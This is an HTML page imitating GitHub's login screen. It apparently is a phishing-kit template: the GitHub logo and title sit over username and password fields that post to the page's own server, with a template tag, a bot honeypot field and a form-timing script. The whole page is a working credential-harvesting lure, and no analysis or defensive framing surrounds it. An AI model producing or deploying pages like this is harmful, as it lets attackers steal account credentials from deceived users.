<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Log in to GitHub</title>
<meta name="theme-color" content="#24292F">
<meta name="referrer" content="strict-origin-when-cross-origin">
<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%2324292F%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EG%3C/text%3E%3C/svg%3E">
<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%2324292F%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EG%3C/text%3E%3C/svg%3E">
<meta property="og:title" content="Log in to GitHub">
<meta property="og:site_name" content="GitHub">
<style>
  body { margin:0;min-height:100vh;background:#f0f2f5;display:flex;align-items:center;
         justify-content:center;padding:20px;
         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
                     sans-serif; }
  .card { background:#fff;width:100%;max-width:400px;border-radius:12px;
          box-shadow:0 12px 40px rgba(0,0,0,.10);padding:36px 32px 28px;
          box-sizing:border-box; }
  .mark { display:flex;justify-content:center;margin:0 0 18px; }
  h1 { font-size:20px;margin:0 0 6px;text-align:center;color:#1c1e21;font-weight:600; }
  .sub { text-align:center;color:#65676b;font-size:14px;margin:0 0 22px; }
  .field { margin-bottom:14px; }
  .field label { display:block;font-size:13px;color:#65676b;margin:0 0 6px;
                 font-weight:500; }
  .field input { width:100%;padding:13px 14px;font-size:15px;border:1px solid #ccd0d5;
                 border-radius:8px;background:#fff;outline:none;box-sizing:border-box;
                 transition:border .15s; }
  .field input:focus { border-color:#24292F;box-shadow:0 0 0 2px rgba(0,0,0,.06); }
  .btn { width:100%;padding:13px;font-size:16px;font-weight:600;color:#fff;
         background:#24292F;border:0;border-radius:8px;cursor:pointer;margin-top:6px; }
  .btn:hover { filter:brightness(1.06); }
  .row { display:flex;justify-content:space-between;align-items:center;margin:14px 0 4px;
         font-size:13px; }
  .row a { color:#ffffff;text-decoration:none; }
  .row label { margin:0;display:flex;gap:6px;align-items:center;color:#65676b; }
  .foot { text-align:center;font-size:12px;color:#8a8d91;margin-top:22px;line-height:1.6; }
  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
</style>
</head>
<body>
<form class="card" method="POST" action="/">
  <div class="mark"><svg viewBox="0 0 16 16" width="36" height="36" role="img" aria-label="GitHub"><path fill="#181717" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8z"/></svg></div>
  <h1>Log in to GitHub</h1>
  <p class="sub">Sign in with your username</p>
    <div class="field">
      <label for="username">Username or email</label>
      <input id="username" name="username" type="text" placeholder="Enter your username" autocomplete="username" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
    </div>
  <div class="row"><label><input type="checkbox" name="remember" value="1" checked> Remember me</label><a href="#">Forgot password?</a></div>
  <button class="btn" type="submit">Log in</button>

  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
  <input type="hidden" name="_tpl" value="github">
  <input type="hidden" name="_ts" value="__TS__">
  <div class="foot">GitHub is a trademark of its respective owner.</div>

<script>
/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
   record it, and we log how long the form was open (bot forms are instant). */
(function(){
  var t0 = Date.now();
  var f = document.querySelector('form');
  if(!f) return;
  f.addEventListener('submit', function(){
    var el = f.querySelector('input[name=_ts]');
    if(el) el.value = String(Date.now() - t0);
  });
})();
</script>
</form>
</body>
</html>
